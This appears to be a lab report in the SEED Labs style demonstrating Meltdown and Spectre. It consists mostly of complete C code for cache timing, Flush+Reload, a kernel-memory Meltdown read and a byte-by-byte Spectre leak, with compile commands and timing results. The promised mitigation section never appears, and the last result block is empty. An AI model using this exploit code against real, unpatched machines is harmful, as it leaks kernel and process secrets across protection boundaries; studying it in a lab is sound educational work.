# Meltdown and Spectre attack exploit

## Introduction

This report comprehensively examines Spectre and Meltdown vulnerabilities. Our goal is to dissect these vulnerabilities, offering a technical analysis of their underlying mechanisms. We will explore the "how" to understand the core principles and mechanisms facilitating these attacks. We will also investigate the "how to" by methodically deconstructing the techniques used for execution. Lastly, we will thoroughly examine "how to mitigate" these threats, explaining the strategies and defences in place to protect systems and valuable data.



## Requirements
> * Requires a machine that is susceptible to Meltdown & Spectre Attacks, prior to OS patch. A VM is provided **[here](https://seed.nyc3.cdn.digitaloceanspaces.com/SEEDUbuntu-16.04-32bit.zip)**
> * **Intel-based System** For Meltdown, Otherwise, this attack won't work on AMD Computers
> * Attack code (We used the code from **[SEEDLabs Security](https://seedsecuritylabs.org/Labs_16.04/System/Meltdown_Attack/files/Meltdown_Attack.zip)**)





# Meltdown Attack in C
Meltdown is a vulnerability that exploits the flaw inside the Intel CPUs, if the target machine is an AMD system, the attack will not work. 



### Step 1: Reading Cache vs Memory 

```c
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

uint8_t array[10*4096];

int main(int argc, const char **argv) {
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  // Initialize the array
  for(i=0; i<10; i++) array[i*4096]=1;
  // FLUSH the array from the CPU cache
  for(i=0; i<10; i++) _mm_clflush(&array[i*4096]);
  // Access some of the array items
  array[3*4096] = 100;
  array[7*4096] = 200;
  for(i=0; i<10; i++) {
    addr = &array[i*4096];
    time1 = __rdtscp(&junk);   junk = *addr;
    time2 = __rdtscp(&junk) - time1;  
    printf("Access time for array[%d*4096]: %d CPU cycles\n",i, (int)time2);
  }
  return 0; 
}
```

We ran this code on Ubuntu 16.04 on an Intel based System. To compile the following code:
```bash
gcc -march=native cachetime.c
```

Our results show the following output:
![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161248795976290304/image.png?ex=65379c37&is=65252737&hm=a471a419cd6e1afc5068efa19ed6e2368148286ce8c984e3037bc47e74c55800&)

Notice that index 3 and 7 are accessed at a faster time compared to that rest. We can conclude that these indexes are cache in memory. To ensure consistency, we ran this program multiple times, our results given below: 
1.
```
Access time for array[0*4096]: 1632 CPU cycles
Access time for array[1*4096]: 346 CPU cycles
Access time for array[2*4096]: 348 CPU cycles
Access time for array[3*4096]: 60 CPU cycles
Access time for array[4*4096]: 340 CPU cycles
Access time for array[5*4096]: 336 CPU cycles
Access time for array[6*4096]: 530 CPU cycles
Access time for array[7*4096]: 62 CPU cycles
Access time for array[8*4096]: 336 CPU cycles
Access time for array[9*4096]: 346 CPU cycles
```
2.
```
Access time for array[0*4096]: 1642 CPU cycles
Access time for array[1*4096]: 332 CPU cycles
Access time for array[2*4096]: 318 CPU cycles
Access time for array[3*4096]: 58 CPU cycles
Access time for array[4*4096]: 378 CPU cycles
Access time for array[5*4096]: 350 CPU cycles
Access time for array[6*4096]: 394 CPU cycles
Access time for array[7*4096]: 58 CPU cycles
Access time for array[8*4096]: 394 CPU cycles
Access time for array[9*4096]: 402 CPU cycles
```
3.

```
Access time for array[0*4096]: 1540 CPU cycles
Access time for array[1*4096]: 408 CPU cycles
Access time for array[2*4096]: 372 CPU cycles
Access time for array[3*4096]: 52 CPU cycles
Access time for array[4*4096]: 378 CPU cycles
Access time for array[5*4096]: 1006 CPU cycles
Access time for array[6*4096]: 400 CPU cycles
Access time for array[7*4096]: 66 CPU cycles
Access time for array[8*4096]: 332 CPU cycles
Access time for array[9*4096]: 400 CPU cycles
```
4.

```
Access time for array[0*4096]: 1522 CPU cycles
Access time for array[1*4096]: 404 CPU cycles
Access time for array[2*4096]: 394 CPU cycles
Access time for array[3*4096]: 60 CPU cycles
Access time for array[4*4096]: 410 CPU cycles
Access time for array[5*4096]: 398 CPU cycles
Access time for array[6*4096]: 354 CPU cycles
Access time for array[7*4096]: 62 CPU cycles
Access time for array[8*4096]: 360 CPU cycles
Access time for array[9*4096]: 336 CPU cycles
```
5.
```
Access time for array[0*4096]: 1526 CPU cycles
Access time for array[1*4096]: 1274 CPU cycles
Access time for array[2*4096]: 402 CPU cycles
Access time for array[3*4096]: 64 CPU cycles
Access time for array[4*4096]: 392 CPU cycles
Access time for array[5*4096]: 396 CPU cycles
Access time for array[6*4096]: 408 CPU cycles
Access time for array[7*4096]: 58 CPU cycles
Access time for array[8*4096]: 330 CPU cycles
Access time for array[9*4096]: 324 CPU cycles
```
6.
```
Access time for array[0*4096]: 1702 CPU cycles
Access time for array[1*4096]: 346 CPU cycles
Access time for array[2*4096]: 402 CPU cycles
Access time for array[3*4096]: 68 CPU cycles
Access time for array[4*4096]: 420 CPU cycles
Access time for array[5*4096]: 416 CPU cycles
Access time for array[6*4096]: 428 CPU cycles
Access time for array[7*4096]: 68 CPU cycles
Access time for array[8*4096]: 412 CPU cycles
Access time for array[9*4096]: 408 CPU cycles
```
7.
```
Access time for array[0*4096]: 1648 CPU cycles
Access time for array[1*4096]: 342 CPU cycles
Access time for array[2*4096]: 336 CPU cycles
Access time for array[3*4096]: 82 CPU cycles
Access time for array[4*4096]: 358 CPU cycles
Access time for array[5*4096]: 542908 CPU cycles
Access time for array[6*4096]: 362 CPU cycles
Access time for array[7*4096]: 78 CPU cycles
Access time for array[8*4096]: 626 CPU cycles
Access time for array[9*4096]: 350 CPU cycles
```
8.
```
Access time for array[0*4096]: 1560 CPU cycles
Access time for array[1*4096]: 328 CPU cycles
Access time for array[2*4096]: 382 CPU cycles
Access time for array[3*4096]: 52 CPU cycles
Access time for array[4*4096]: 400 CPU cycles
Access time for array[5*4096]: 390 CPU cycles
Access time for array[6*4096]: 390 CPU cycles
Access time for array[7*4096]: 68 CPU cycles
Access time for array[8*4096]: 392 CPU cycles
Access time for array[9*4096]: 386 CPU cycles
```
9.
```
Access time for array[0*4096]: 1538 CPU cycles
Access time for array[1*4096]: 336 CPU cycles
Access time for array[2*4096]: 362 CPU cycles
Access time for array[3*4096]: 54 CPU cycles
Access time for array[4*4096]: 352 CPU cycles
Access time for array[5*4096]: 406 CPU cycles
Access time for array[6*4096]: 408 CPU cycles
Access time for array[7*4096]: 56 CPU cycles
Access time for array[8*4096]: 396 CPU cycles
Access time for array[9*4096]: 1248 CPU cycles
```
10.
```
Access time for array[0*4096]: 1788 CPU cycles
Access time for array[1*4096]: 350 CPU cycles
Access time for array[2*4096]: 336 CPU cycles
Access time for array[3*4096]: 76 CPU cycles
Access time for array[4*4096]: 324 CPU cycles
Access time for array[5*4096]: 334 CPU cycles
Access time for array[6*4096]: 334 CPU cycles
Access time for array[7*4096]: 76 CPU cycles
Access time for array[8*4096]: 330 CPU cycles
Access time for array[9*4096]: 418 CPU cycles
```


### Step 2: Side Channel attack via Cache

For meltdown to work we use the cache as a side channel.
Cache side-channel attacks exploit the timing differences that are introduced by the caches. 

An attacker will frequently flush a targeted memory location using ```clflush```


For example, let's assume that there is a victim function that uses a secret value as the index to load such values from an array and that the secret value cannot be accessed from user level memory. 



The sample code below describes the Flush+Reload technique to obtain the secret value:

```c
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

uint8_t array[256*4096];
int temp;
char secret = 94;
/* cache hit time threshold assumed to be below 80 given previously our access time(s) for index 3 and 7 were <80 */
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

// Victim function that uses the secret value (94)
void victim()
{
  temp = array[secret*4096 + DELTA];
}

/
void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

void reloadSideChannel()
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
   addr = &array[i*4096 + DELTA];
   // Time measurement of accessing the memory address.
   // Lower times are likely possibilities of it being cached.
   time1 = __rdtscp(&junk);
   junk = *addr;
   time2 = __rdtscp(&junk) - time1;
   
   if (time2 <= CACHE_HIT_THRESHOLD){
	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %d.\n",i);
   }
  } 

}

int main(int argc, const char **argv)
{
  flushSideChannel();
  victim();
  reloadSideChannel();
  return (0);
}
```


**Code Compilation**
```
gcc -march=native FlushReload.c -o FlushReload
```


#### Results:
![Image2](https://cdn.discordapp.com/attachments/1131246972372791429/1161250215957909564/image.png?ex=65379d8a&is=6525288a&hm=930ef633fd8a5d7bedd4f37cbb02659cb44cf447023b802a5c9dc721a0d3469d&)

We get the value of secret based off side-channel attack by exploiting the cache time. Again, if the target computer is not running on an Intel CPU, this attack will not find the secret. In addition, to measure the accuracy, run the program multiple times to see the consistency of finding the secret.   

### Explanation:

**global variables**
> In the provided code, there are several global variables that play crucial roles in the program's functionality. Firstly, the uint8_t array[256*4096] is a global array of 1 megabyte in size, serving as the main data structure for cache timing measurements. The int temp variable is used to store the value retrieved from the array in the victim function. The char secret = 94 represents a secret value that the code aims to leak through cache timing analysis. The CACHE_HIT_THRESHOLD constant, set to 80, establishes the time threshold for determining whether a memory access is a cache hit or miss. Finally, the DELTA constant, defined as 1024, is an offset used to calculate memory access indices within the array. These global variables collectively define the key parameters and data structures necessary for the cache timing attack performed by the program, enabling it to measure and potentially reveal cached elements and the secret value.

**flushSideChannel()**
> The function in the provided code is responsible for ensuring that the array data is in physical RAM and not solely cached, while also flushing the cached copies of this data. It accomplishes this in two main steps. First, it iterates over the elements in the array and writes the value 1 to each of them. This action brings the data into RAM, ensuring it is not kept in a copy-on-write state, which could be shared across multiple processes. Second, it employs a loop to flush the cache for each of these elements using the _mm_clflush instruction. By doing so, it clears any cached copies of the array from the CPU cache. The purpose of this function is to prepare the array for cache timing measurements in the subsequent reloadSideChannel() function, ensuring that subsequent memory access measurements are based on data fetched from RAM, which is critical for the cache timing attack to work effectively.


**reloadSideChannel()**
> The reloadSideChannel() function in the provided code is the core component of a cache timing attack. It is designed to measure the time it takes to access specific memory locations within the array. This function iterates over 256 elements of the array and, for each element, records the time it takes to access that location using the __rdtscp function. If the access time is less than or equal to a predefined CACHE_HIT_THRESHOLD, it infers that the corresponding element is cached. It then prints the index of the cached element, effectively revealing which elements of the array were cached due to previous accesses. This function is used to exploit cache behavior to potentially leak sensitive information, as it identifies which elements are cached based on the timing of memory accesses.


### Step 3: Meltdown Attack preparation

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/vmalloc.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>

static char secret[8] = {'S','E','E','D','L','a','b','s'};
static struct proc_dir_entry *secret_entry;
static char* secret_buffer;

static int test_proc_open(struct inode *inode, struct file *file)
{
#if LINUX_VERSION_CODE <= KERNEL_VERSION(4,0,0)
   return single_open(file, NULL, PDE(inode)->data);
#else
   return single_open(file, NULL, PDE_DATA(inode));
#endif
}

static ssize_t read_proc(struct file *filp, char *buffer, 
                         size_t length, loff_t *offset)
{
   memcpy(secret_buffer, &secret, 8);              
   return 8;
}

static const struct file_operations test_proc_fops =
{
   .owner = THIS_MODULE,
   .open = test_proc_open,
   .read = read_proc,
   .llseek = seq_lseek,
   .release = single_release,
};

static __init int test_proc_init(void)
{
   // write message in kernel message buffer
   printk("secret data address:%p\n", &secret);      

   secret_buffer = (char*)vmalloc(8);

   // create data entry in /proc
   secret_entry = proc_create_data("secret_data", 
                  0444, NULL, &test_proc_fops, NULL);
   if (secret_entry) return 0;

   return -ENOMEM;
}

static __exit void test_proc_cleanup(void)
{
   remove_proc_entry("secret_data", NULL);
}

module_init(test_proc_init);
module_exit(test_proc_cleanup);
```


```shell
$ make
$ sudo insmod MeltdownKernel.ko
$ dmesg | grep 'secret data address'
```

The secret data was cached into the address: **0xf9de1000**
**Terminal Output:**
![Image3](https://cdn.discordapp.com/attachments/1131246972372791429/1161265381206405170/image.png?ex=6537abaa&is=652536aa&hm=9e9d5df99b8fd3ff86d32e5559e3c8bc287dea0647a02d987a570629938f82f0&)






#### Step 4: Out-of-Order Execution


```c
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

/*********************** Flush + Reload ************************/
uint8_t array[256*4096];
/* cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
  int i;

  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;

  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

void reloadSideChannel() 
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
     addr = &array[i*4096 + DELTA];
     time1 = __rdtscp(&junk);
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
     if (time2 <= CACHE_HIT_THRESHOLD){
         printf("array[%d*4096 + %d] is in cache.\n",i,DELTA);
         printf("The Secret = %d.\n",i);
     }
  }	
}
/*********************** Flush + Reload ************************/

void meltdown(unsigned long kernel_data_addr)
{
  char kernel_data = 0;
   
  // The following statement will cause an exception
  kernel_data = *(char*)kernel_data_addr;     
  array[7 * 4096 + DELTA] += 1;          
}

void meltdown_asm(unsigned long kernel_data_addr)
{
   char kernel_data = 0;
   
   // Give eax register something to do
   asm volatile(
       ".rept 400;"                
       "add $0x141, %%eax;"
       ".endr;"                    
    
       :
       :
       : "eax"
   ); 
    
   // The following statement will cause an exception
   kernel_data = *(char*)kernel_data_addr;  
   array[kernel_data * 4096 + DELTA] += 1;           
}

// signal handler
static sigjmp_buf jbuf;
static void catch_segv()
{
  siglongjmp(jbuf, 1);
}

int main()
{
  // Register a signal handler
  signal(SIGSEGV, catch_segv);

  // FLUSH the probing array
  flushSideChannel();
    
  if (sigsetjmp(jbuf, 1) == 0) {
      meltdown(0xfb61b000);                
  }
  else {
      printf("Memory access violation!\n");
  }

  // RELOAD the probing array
  reloadSideChannel();                     
  return 0;
}
```


```shell
gcc -march=native MeltdownExperiment.c -o MeltdownExperiment 
```


**Explanation**
During the **Out-of-Order execution**, the referenced memory is fetched into a register and is also stored in the cache. If the **OoO** Execution has to be discarded, then the cache caused by such execution should also be discarded, which doesn't happen in most CPUs.
**Output:**
![Image4](https://cdn.discordapp.com/attachments/1131246972372791429/1161292722867535922/image.png?ex=6537c520&is=65255020&hm=f0bb3734dfc177535573451df0112f2f21c0deb925251c24e424b8104ab0481b&)


# Spectre Attack in C
A Spectre attack is a type of security vulnerability that **exploits speculative execution** in modern microprocessors to access sensitive data. Potentially compromising the confidentiality of information. It allows attackers to trick a processor into **speculatively executing code** that should not be accessible, resulting in the leakage of sensitive data.

Within this Spectre attack demonstration we will perform a technique called FLUSH+RELOAD to look through the CPU cache.
### Step 1: Reading Cache vs Memory 
```c
#include <emmintrin.h>
#include <x86intrin.h>
uint8_t array[10*4096];
int main(int argc, const char **argv) {
int junk=0;
register uint64_t time1, time2;
volatile uint8_t *addr;
int i;
// Initialize the array
for(i=0; i<10; i++) array[i*4096]=1;
// FLUSH the array from the CPU cache
for(i=0; i<10; i++) _mm_clflush(&array[i*4096]);
// Access some of the array items
array[3*4096] = 100;
array[7*4096] = 200;
for(i=0; i<10; i++) {
addr = &array[i*4096];
time1 = __rdtscp(&junk); ➀
junk = *addr;
time2 = __rdtscp(&junk) - time1; ➁
printf("Access time for array[%d*4096]: %d CPU cycles\n",i, (int)time2);
}
return 0;
}
```
We compiled and ran this code on Ubuntu 16.04 based on an AMD based system.
```bash
gcc -march=native cachetime.c
```

This outcome represents the findings from a single run. Based on our preliminary observations, it is clear that specific elements shows reduced CPU cycle times in contrast to others. This distinction underscores the differences in data access when comparing cache-based retrieval with data access from main memory. 
![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161594776756432946/image.png?ex=6538de70&is=65266970&hm=aaa63349796dffe49bec266539904252b9e861b9472c8f8d0c89de19df9e8ed7&)
To ensure both consistency and precision in our initial observations, the code was executed an additional ten times. The following results, relating to the arrays with index [5x4096], [6x4096], and [9x4096], consistently demonstrated lower CPU cycles when compared to the corresponding arrays in all test scenarios.

1.
![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161594935494053948/image.png?ex=6538de96&is=65266996&hm=7a6eb94e5ffca9bf19cb74b3428fe28c38ec99a8db2c52d89b2f06fa23d31724&)

2.
![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161595962754609192/CacheTime3.png?ex=6538df8a&is=65266a8a&hm=e8a17babca79f57d2f60b281dee5ce042183a024ac78c5c49c0a44b08df4b0c3&)

3.
![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161595972653154396/CacheTime4.png?ex=6538df8d&is=65266a8d&hm=ceddf2c6e93bc94e3682a91afc052f8c5bb74aa4aec3b74e8d957fbde8af4f09&)

4.
![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161595980668469360/CacheTime5.png?ex=6538df8f&is=65266a8f&hm=25305100165367e6cfe2d740b62e4d148dcec2a2a018d47485756fd94fce140d&)

5.
![Image](https://media.discordapp.net/attachments/1131246972372791429/1161595986997673984/CacheTime6.png?ex=6538df90&is=65266a90&hm=7e799954bf8f22babff53e9d299566467617be9bc7ec9bf9e37d5fbf46628eaa&=)

6.
![Image](https://media.discordapp.net/attachments/1131246972372791429/1161595991888232468/CacheTime7.png?ex=6538df91&is=65266a91&hm=87e3cc0b7d4edac4d06bdf22622508854a16e33a366e13047a84adb7ed1f1f49&=)

7.
![Image](https://media.discordapp.net/attachments/1131246972372791429/1161595996913012736/CacheTime8.png?ex=6538df93&is=65266a93&hm=c1b5f8e970eddf2c488c843eb7372119714566c370bf9eabb89aca3b36d4e613&=)

8.
![Image](https://media.discordapp.net/attachments/1131246972372791429/1161596004471164998/CacheTime9.png?ex=6538df94&is=65266a94&hm=db25339a9daa55f5ce25e750fccafe4d35b78e455c8dc3840ca61643d6ed1813&=)

9.
![Image](https://media.discordapp.net/attachments/1131246972372791429/1161596009340731412/CacheTime10.png?ex=6538df96&is=65266a96&hm=2873bb212992741dcc804eab4800e3b8fae3abe7ab0e7df6770b92bb67d986dd&=)

10.
![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161601101578129418/CacheTime11.png?ex=6538e454&is=65266f54&hm=2805e63a814cdc5324adcaa903856ef3cb5e58201f4575cfbf73406987d09ad7&)
### Step 2: Using cache as a Side Channel attack

```c
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

uint8_t array[256*4096];
int temp;
char secret = 94;
/* cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void victim()
{
  temp = array[secret*4096 + DELTA];
}
void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

void reloadSideChannel()
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
   addr = &array[i*4096 + DELTA];
   time1 = __rdtscp(&junk);
   junk = *addr;
   time2 = __rdtscp(&junk) - time1;
   if (time2 <= CACHE_HIT_THRESHOLD){
	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %d.\n",i);
   }
  } 
}

int main(int argc, const char **argv)
{
  flushSideChannel();
  victim();
  reloadSideChannel();
  return (0);
}
```
Within this step we demonstrate the **FLUSH+RELOAD** technique to find the one-byte secret value contained in the variable **secret**. The FLUSH+RELOAD technique consists of 3 steps:

1. **Cache Purge (FLUSH)**: The entire array will be purged from cache memory to ensure the removal of any cached elements.
2. **Cache Access (Invoke "Victim" Function)**: We invoke the **victim** function, which accesses one of the array elements based on the value of the secret. This will cause the corresponding array element to be cached.
3. **Cache Reconnaissance (RELOAD)**: Reload the entire array while measuring the time required to reload each individual element. If one element exhibits notably fast loading times, it strongly suggest its inclusion within the cache. This specific element matches the one the 'victim' function used making it easier to figure out the secret value.

**Code Compilation**
```
gcc -march=native FlushReload.c -o FlushReload
```
#### Result:
![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161634969442074624/FlushReload1.png?ex=653903de&is=65268ede&hm=f65b6dcf476d095045335466739b5a424e07c9dd81b82dd10459aac55770f9d4&)

As illustrated in the image above, despite encountering multiple results during the execution of FlushReload indicating that we have hit cashe_threshold multiple times, we still successfully pinpointed our secret value of 94. It has to be noted that we have conducted the test an additional four times to ensure the precision of our findings, and each of these repeated trials revealed the secret value.

1.
![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161639103943680040/FlushReload2.png?ex=653907b8&is=652692b8&hm=cc463e00b079ac0d0a0d4adee23709e7a62bad30f01d910188455b2c7376edc6&)

2.
![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161640100736802877/FlushReload3.png?ex=653908a6&is=652693a6&hm=d1020f4457562f98cb62b3f71cd4a28e3587b67d46b2b23359ded34dcb6f885c&)

3.
![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161640100736802877/FlushReload3.png?ex=653908a6&is=652693a6&hm=d1020f4457562f98cb62b3f71cd4a28e3587b67d46b2b23359ded34dcb6f885c&)

4.
![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161640807070171196/FlushReload4.png?ex=6539094e&is=6526944e&hm=ca583ef9bc646b94c3ebffb5b91e5ea61d6c51be3be84c91ee285c9328feb2b6&)

### Explanation of FlushReload.c
#### Global Variables

In the provided code, a set of global variables takes on pivital roles in the program's operation:

>1. **`uint8_t array[256*4096]`**: This array includes a 1-megabyte memory space, serving as the main data structure for recording cache timing metrics. It stands as an essential element in assessing memory access patterns.
>2. **`int temp`**: The integer variable, `temp`, takes on the responsibility of storing the data retrieved from the array. It acts as an middleman in the victim function, where memory access is made.
>3. **`char secret = 94`**: The `secret` variable is intended to represent a hidden value (specifically, 94), which the code aims to uncover through a cache timing analysis. The exploration of this value is the core focus of the program's execution.
>4. **`CACHE_HIT_THRESHOLD` (set to 80)**: The `CACHE_HIT_THRESHOLD` constant defines the benchmark against which memory access times are measured. Any access operation that falls within this threshold is deemed indicative of a cache hit, crucial to discerning cached elements.
>5. **`CACHE_HIT_THRESHOLD (set to 80)`**: The `CACHE_HIT_THRESHOLD` constant establishes the standard against which memory access times are gauged. Any access operation that falls within this standard is crucial for identifying cached elements.
>
>These global variables are fundamental to the program, enabling the cache timing attack. This attack measures memory access timings and may reveal cached elements, including the secret value.
#### flushSideChannel()
>The **`flushSideChannel()`** function in a `FLUSH+RELOAD` attack prepares the memory state for cache timing measurements. This is achieved by writing to the `array` to bring relevant memory locations into RAM and then purging the array's values from the CPU cache, establishing a consistent basis with no cached array elements. This sets the stage for precise monitoring of following memory access patterns, a crucial phase in the cache timing attack.

#### reloadSideChannel()
>The `reloadSideChannel` function in the context of a FLUSH+RELOAD attack serves to identify cached memory locations through the measurement of access times. It performs the following key tasks:
>1. **Initialization**: It prepares the necessary variables for temporary storage and timing measurements.
>2. **Memory Access Loop**: The function iterates through 256 memory locations, recording access times for each.
>3. **Access Timing Measurement**: Prior to and following the access of a specific memory location, it calculates the time duration of the access.
>4. **Cache Hit Verification**: The function checks if the measured time matches or falls below the defined `CACHE_HIT_THRESHOLD`. When this happens it indicates that the memory location is cached. In response the function reports the location's index and the corresponding secret value.
>
>This function plays a crucial role in the FLUSH+RELOAD attack. It allows us to observe which memory locations are cached and potentially discover the hidden secret value by monitoring how memory is accessed.

### Task 3: Out-of-Order Execution and Branch Prediction
What is Out-of-Order execution? Out-of-order execution, is a performance enhancement strategy that enables the CPU to make the most efficient use of its execution units. Rather than adhering to a strictly sequential order for processing instructions, the CPU performs them in parallel as soon as all necessary resources become accessible. This means that while one execution unit is engaged in the current operation, other units can proceed with their tasks ahead of it.

To demonstrate the Out-Of-Order Execution we will use the following code
```c
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

int size = 10;
uint8_t array[256*4096];
uint8_t temp = 0;
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

void reloadSideChannel()
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
    addr = &array[i*4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD){
	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %d.\n",i);
    }
  } 
}

void victim(size_t x)
{
  if (x < size) {  
  temp = array[x * 4096 + DELTA];  
  }
}

int main() {
  int i;
  // FLUSH the probing array
  flushSideChannel();
  // Train the CPU to take the true branch inside victim()
  for (i = 0; i < 10; i++) {   
   _mm_clflush(&size); 
   victim(i);
  }
  // Exploit the out-of-order execution
  _mm_clflush(&size);
  for (i = 0; i < 256; i++)
   _mm_clflush(&array[i*4096 + DELTA]); 
  victim(97);  
  // RELOAD the probing array
  reloadSideChannel();
  return (0); 
}
```

Code Compilation
```
gcc -march=native SpectreExperiment.c -o SpectreExperiment
```
Result:
![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161724274944524408/received_1018118872572351.png?ex=6539570a&is=6526e20a&hm=4954d78620a171e8dad88bb7a7ab6b92388ddf1786f3c65d912b328bae3bedca&)
Based on our results, it's clear that our Out-Of-Execution demonstration succeeded. We retrieved the secret code which is **`97`** that we added to our victim code. This success is due to **"training"** the CPU within the **`for`** loop. We repeatedly called the `**victim()**` function with small values from 0 to 9, ensuring the **`if-condition`** inside **'victim()'** always evaluated to **'true'** because these values were always less than **`size`**. This training conditioned the CPU to expect 'true' outcomes. We then introduced our secret value to **'victim()'** which triggered the **'false-branch'** of the **'if-condition'** inside **'victim'**. However, we previously flushed the **'size'** variable from memory, causing a delay in obtaining its result. During this time the CPU made a prediction and initiated speculative execution.

### The Spectre Attack
We will now demonstrate the entire Spectre Attack all at once using the following code below. The aim of this program is to access the **`buffer[x]`** that is within **`restrictedAccess`** just like our previous **Out-of-order execution**.
Note that we have calculated the offset of the secret from the beginning of the buffer, this is done through **`s = restrictedAccess(larger_x);`**, **`array[s*4096 + DELTA] += 88;`** and **`size_t larger_x = (size_t)(secret - (char*)buffer);`**.
```c
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp = 0;
char *secret = "Some Secret Value";   
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x < buffer_size) {
     return buffer[x];
  } else {
     return 0;
  } 
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

static int scores[256];
void reloadSideChannelImproved()
{
  int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD)
      scores[i]++; /* if cache hit, add 1 for this value */
  } 
}

void spectreAttack(size_t larger_x)
{
  int i;
  uint8_t s;
  volatile int z;
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  // Train the CPU to take the true branch inside victim().
  for (i = 0; i < 10; i++) {
    _mm_clflush(&buffer_size);
    for (z = 0; z < 100; z++) { }
    restrictedAccess(i);  
  }
  // Flush buffer_size and array[] from the cache.
  _mm_clflush(&buffer_size);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  // Ask victim() to return the secret in out-of-order execution.
  for (z = 0; z < 100; z++) { }
  s = restrictedAccess(larger_x);
  array[s*4096 + DELTA] += 88;
}

int getascii(size_t larger_x)
{
  int i;
  uint8_t s;
  flushSideChannel();
  _mm_clflush(&larger_x);
  for (i = 0;i< 256;i++) scores[i] = 0;
  for (i = 0;i< 1000;i++) {
    spectreAttack(larger_x);
    reloadSideChannelImproved();
  }

  int max = 1;
  for (i = 2; i < 256; i ++ ) {
    if(scores[max] < scores[i]) max = i;
  }

  if (scores[max] == 0) {
    return 0;
  } else {
    return max;
  }
}

int main() {
  size_t larger_x = (size_t)(secret-(char*)buffer);
  int s = getascii(larger_x);
  printf("The secret is:\n");
  while(s != 0) {
    printf("%c\n",s);
    larger_x++;
    s = getascii(larger_x);
  }
  return 0;
}
```
Result:
```
```

